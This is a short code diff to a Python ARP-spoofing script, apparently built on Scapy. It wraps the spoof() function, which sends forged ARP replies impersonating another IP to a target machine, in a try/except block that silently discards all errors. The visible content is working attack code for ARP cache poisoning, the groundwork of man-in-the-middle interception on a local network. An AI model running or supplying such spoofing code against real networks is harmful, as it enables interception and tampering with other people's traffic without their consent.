@@ -43,9 +43,12 @@ def spoof(target_ip, spoof_ip):
         target_ip (str): The IP address of the target machine to spoof.
         spoof_ip (str): The IP address to impersonate.
     """
-    target_mac = get_mac(target_ip)
-    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-    send(packet, verbose=False)
+    try:
+        target_mac = get_mac(target_ip)
+        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        send(packet, verbose=False)
+    except:
+        pass
 
 def restore(destination_ip, source_ip):
     """
